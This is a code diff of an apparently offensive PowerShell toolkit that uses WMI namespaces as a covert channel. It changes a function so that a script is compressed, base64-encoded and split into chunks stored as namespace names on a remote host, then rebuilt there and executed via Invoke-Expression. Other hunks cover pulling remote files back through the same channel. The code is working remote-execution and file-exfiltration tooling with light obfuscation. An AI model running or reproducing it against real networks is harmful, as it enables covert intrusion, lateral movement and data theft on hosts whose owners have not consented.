@@ -39,7 +39,7 @@ New-Object -TypeName PSObject -Property $props
 
 }
 
-function Invoke-WmiCommand {
+function Invoke-WmiExpression {
 Param (	
     [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
     [string[]]
@@ -60,42 +60,62 @@ Param (
     $Tag = ([System.IO.Path]::GetRandomFileName()).Remove(8,4),
     
     [Parameter()]
-    [switch]
-    $Posh,
-    
-    [Parameter()]
-    [switch]
-    $Cmd
+    [ValidateNotNullOrEmpty()]
+    [ScriptBlock]
+    $ScriptBlock,
+
+    [Parameter(Position = 0, ParameterSetName = 'FilePath' )]
+    [ValidateNotNullOrEmpty()]
+    [String]
+    $Path
 
 ) # End Param
 
-    $remoteScript = @"
-    Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
-    `$wshell = New-Object -c WScript.Shell
-    function Insert-Piece(`$i, `$piece) {
-        `$count = `$i.ToString()
-	    `$zeros = "0" * (6 - `$count.Length)
-	    `$tag = $Tag + `$zeros + `$count
-	    `$piece = `$tag + `$piece 
-	    `$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$piece}
+    if ($PSBoundParameters['Path']) {
+        $null = Get-ChildItem $Path -ErrorAction Stop
+        $ScriptBytes = [IO.File]::ReadAllBytes((Resolve-Path $Path))
     }
-	`$Exec = `$wshell.Exec("%comspec% /c " + "$command") 
-	`$Out = `$Exec.StdOut.ReadAll()
-    `$outEnc = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$Out))
-    `$outEnc = `$outEnc -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
-    `$nop = [Math]::Floor(`$outEnc.Length / 5500)
-    if (`$outEnc.Length -gt 5500) {
-        `$lastp = `$outEnc.Substring(`$outEnc.Length - (`$outEnc.Length % 5500), (`$outEnc.Length % 5500))
-        `$outEnc = `$outEnc.Remove(`$outEnc.Length - (`$outEnc.Length % 5500), (`$outEnc.Length % 5500))
-        for(`$i = 1; `$i -le `$nop; `$i++) { 
-	        `$piece = `$outEnc.Substring(0,5500)
-		    `$outEnc = `$outEnc.Substring(5500,(`$outEnc.Length - 5500))
-		    Insert-Piece `$i `$piece
+    else {
+        $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($ScriptBlock)
+    }
+
+    $CompressedStream = New-Object IO.MemoryStream
+    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
+    $DeflateStream.Dispose()
+    $CompressedScriptBytes = $CompressedStream.ToArray()
+    $CompressedStream.Dispose()
+    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
+
+    $outEnc = $EncodedCompressedScript -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
+    $nop = [Math]::Floor($outEnc.Length / 5500)
+    if ($outEnc.Length -gt 5500) {
+        $lastp = $outEnc.Substring($outEnc.Length - ($outEnc.Length % 5500), ($outEnc.Length % 5500))
+        $outEnc = $outEnc.Remove($outEnc.Length - ($outEnc.Length % 5500), ($outEnc.Length % 5500))
+        for($i = 1; $i -le $nop; $i++) { 
+	        $piece = $outEnc.Substring(0,5500)
+		    $outEnc = $outEnc.Substring(5500,($outEnc.Length - 5500))
+		    Upload-Piece -ComputerName $ComputerName -UserName $UserName -Namespace $Namespace -Tag $Tag -Piece $piece -Count $i
         }
-        `$outEnc = `$lastp
+        $outEnc = $lastp
     }
-	Insert-Piece (`$nop + 1) `$outEnc 
-	`$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='OUTPUT_READY'}
+	Upload-Piece -ComputerName $ComputerName -UserName $UserName -Namespace $Namespace -Tag $Tag -Piece $outEnc -Count ($nop + 1)
+
+    $remoteScript = @"
+    `$getB64strings = Get-WmiObject -Namespace $Namespace -Query "SELECT Name FROM __Namespace WHERE Name like '$Tag%'" | % {`$_.Name} | Sort-Object
+    foreach (`$line in `$getB64strings) {
+		`$cleanString = `$line.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
+		`$reconstructed += `$cleanString
+    }
+    Set-Alias a New-Object
+    Try { `$Script = (a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('`$reconstructed'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd() }
+    Catch [System.Management.Automation.MethodInvocationException] {
+	    Try { `$Script = (a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('`$reconstructed' + '='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd() }
+	    Catch [System.Management.Automation.MethodInvocationException] {
+		    `$Script = (a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('`$reconstructed' + '=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd() }
+	    Finally {}
+    }
+    Finally { Invoke-Expression `$Script }
 "@
     $scriptBlock = [scriptblock]::Create($remoteScript)
     $encPosh = Out-EncodedCommand -NoProfile -NonInteractive -ScriptBlock $scriptBlock
@@ -378,11 +398,11 @@ Param (
     $remoteScript = @"
     Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'DOWNLOAD_READY'" | Remove-WmiObject
     function Insert-Piece(`$i, `$piece) {
-        `$count = `$i.ToString()
-	    `$zeros = "0" * (6 - `$count.Length)
-	    `$tag = $Tag + `$zeros + `$count
-	    `$piece = `$tag + `$piece 
-	    `$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$piece}
+        `$Count = `$i.ToString()
+	    `$Zeros = "0" * (6 - `$Count.Length)
+	    `$Tag = $Tag + `$Zeros + `$Count
+	    `$Piece = `$Tag + `$piece 
+	    `$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$Piece}
     }
 	`$encFile = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$RemotePath"))
     `$encFile = `$encFile -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
@@ -410,7 +430,7 @@ Param (
     until($fileReady)
     $null = Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'DOWNLOAD_READY'" | Remove-WmiObject
 
-    Get-WmiFile -UserName $UserName -ComputerName $ComputerName -Namespace $Namespace -Tag $Tag -Path $LocalDestination
+    Get-WmiFile -ComputerName $ComputerName -UserName $UserName -Namespace $Namespace -Tag $Tag -Path $LocalDestination
 }
 
 function Close-WmiSession {
@@ -420,39 +440,26 @@ function Close-WmiSession {
 function Get-WmiShellOutput{
 <#
 .SYNOPSIS
-
 Retrieves Base64 encoded data stored in WMI namspaces and decodes it.
-
 Author: Jesse Davis (@secabstraction)
 License: BSD 3-Clause
 Required Dependencies: None
 Optional Dependencies: None
  
 .DESCRIPTION
-
 Get-WmiShellOutput will query the WMI namespaces of specified remote host(s) for encoded data, decode the retrieved data and write it to StdOut.
  
 .PARAMETER ComputerName 
-
 Specifies the remote host to retrieve data from.
-
 .PARAMETER UserName
-
 Specifies the Domain\UserName to create a credential object for authentication, will also accept a PSCredential object. If this parameter
 isn't used, the credentials of the current session will be used.
-
 .EXAMPLE
-
 PS C:\> Get-WmiShellOutput -ComputerName Server01 -UserName Administrator
-
 .NOTES
-
 This cmdlet was inspired by the work of Andrei Dumitrescu's python implementation.
-
 .LINK
-
 http://www.secabstraction.com/
-
 #>
 
 	Param (
@@ -529,6 +536,7 @@ Param (
     
     [Parameter(Mandatory = $True)]
     [string]$Path
+
 ) # End Param
 
     $getB64strings = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT Name FROM __Namespace WHERE Name like '$Tag%'" | % {$_.Name} | Sort-Object
@@ -540,7 +548,7 @@ Param (
     Catch [System.Management.Automation.MethodInvocationException] {
 	    Try { $DecodedByteArray = [System.Convert]::FromBase64String($reconstructed + "=") }
 	    Catch [System.Management.Automation.MethodInvocationException] {
-		    $DecodeBytedArray = [System.Convert]::FromBase64String($reconstructed + "==") }
+		    $DecodedByteArray = [System.Convert]::FromBase64String($reconstructed + "==") }
 	    Finally {}
     }
     Finally { [System.IO.File]::WriteAllBytes($Path, $DecodedByteArray) }
